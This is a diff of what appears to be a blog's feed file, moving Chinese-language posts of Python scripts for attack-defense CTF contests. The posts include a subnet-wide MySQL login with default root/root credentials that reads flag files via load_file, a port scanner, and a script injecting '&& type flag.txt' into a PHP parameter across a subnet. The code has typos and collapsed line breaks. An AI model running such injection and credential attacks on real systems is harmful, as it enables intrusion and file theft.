@@ -495,6 +495,31 @@
     
     
     <entry>
+      <title>【PythonScript】:PyMySQL</title>
+      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/"/>
+      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/</url>
+      
+        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>突然想起来MYSQL是否也能做成自动GETFALG脚本呢。</p><a id="more"></a><p>这个还有点问题。可以自己修改下:)</p><pre><code class="language-Python">import pymysqlimport threadingfile=open('MySQLsave.txt','w+')def mysql_login(i):    ip='192.168.'+str(i)+'101'    username='root'    password='root'    payload = &quot;SELECT load_file('C:/flag*.txt')&quot;    try:        db = pymysql.connect(ip,username,password,&quot;mysql&quot;)        cursor = db.cursor()        cursor.execute(payload)        data = cursor.fetchall()        print(data)    except:        passfor i in range(1,249):    t = threading.Thread(target=mysql, args=(i,))    t.start()</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Python </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Python </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>【PythonScript】:WebShell</title>
       <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/"/>
       <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/</url>
@@ -520,11 +545,11 @@
     
     
     <entry>
-      <title>【PythonScript】:PyMySQL</title>
-      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/"/>
-      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/</url>
+      <title>【PythonScript】:PortScanner</title>
+      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(PortScanner)/"/>
+      <url>/2018/10/10/Python%E8%84%9A%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(PortScanner)/</url>
       
-        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>突然想起来MYSQL是否也能做成自动GETFALG脚本呢。</p><a id="more"></a><p>这个还有点问题。可以自己修改下:)</p><pre><code class="language-Python">import pymysqlimport threadingfile=open('MySQLsave.txt','w+')def mysql_login(i):    ip='192.168.'+str(i)+'101'    username='root'    password='root'    payload = &quot;SELECT load_file('C:/flag*.txt')&quot;    try:        db = pymysql.connect(ip,username,password,&quot;mysql&quot;)        cursor = db.cursor()        cursor.execute(payload)        data = cursor.fetchall()        print(data)    except:        passfor i in range(1,249):    t = threading.Thread(target=mysql, args=(i,))    t.start()</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
+        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>在实训室无聊的时候，随手写了一下端口扫描的Python脚本.</p><a id="more"></a><pre><code class="language-Python">import socketimport threadingfile=open(&quot;port.txt&quot;,'w+')def portscan(port):    host='192.168.174.1'    try:        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)        conn=s.connect_ex((host,port))        if conn ==0:            print(&quot;HOST &gt; {} : OPEN : {}&quot;.format(host,post))            file.write(host+&quot;:&quot;+str(post)+&quot;\n&quot;)        else:            pass    excpet:        passfor port in range(1,65535):    t=threading.Thread(target=portscan, args=(port, ))    t.start()</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
       
       
       <categories>
@@ -600,31 +625,6 @@
       <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/</url>
       
         <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p><strong>使用urlilb模块</strong></p><p><strong>在一些特定的攻防比赛中，攻击机没有安装requests模块，只能使用urlilb模块来代替</strong></p><a id="more"></a><pre><code class="language-Python">import urllib.parseimport urllib.requestimport threadingdef WebShell(i):    data = {&quot;dir&quot;: &quot;&amp;&amp; type flag.txt&quot;}    url = &quot;http://192.168.123.&quot;+str(i)+&quot;/DirCtrl.php&quot;    data_string=urllib.parse.urlencode(data)    new_url=url+&quot;?&quot;+data_string    try:        send = urllib.request.urlopen(new_url,timeout=1)        print(send.read().decode(&quot;utf8&quot;,&quot;ignore&quot;))    except:        passfor i in range(1,255):    t = threading.Thread(target=WebShell, args=(i, ))    t.start()</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> Python </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Python </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>【PythonScript】:PortScanner</title>
-      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(PortScanner)/"/>
-      <url>/2018/10/10/Python%E8%84%9A%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(PortScanner)/</url>
-      
-        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>在实训室无聊的时候，随手写了一下端口扫描的Python脚本.</p><a id="more"></a><pre><code class="language-Python">import socketimport threadingfile=open(&quot;port.txt&quot;,'w+')def portscan(port):    host='192.168.174.1'    try:        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)        conn=s.connect_ex((host,port))        if conn ==0:            print(&quot;HOST &gt; {} : OPEN : {}&quot;.format(host,post))            file.write(host+&quot;:&quot;+str(post)+&quot;\n&quot;)        else:            pass    excpet:        passfor port in range(1,65535):    t=threading.Thread(target=portscan, args=(port, ))    t.start()</code></pre><p><strong>转载请标明出处</strong></p>]]></content>
       
       
       <categories>
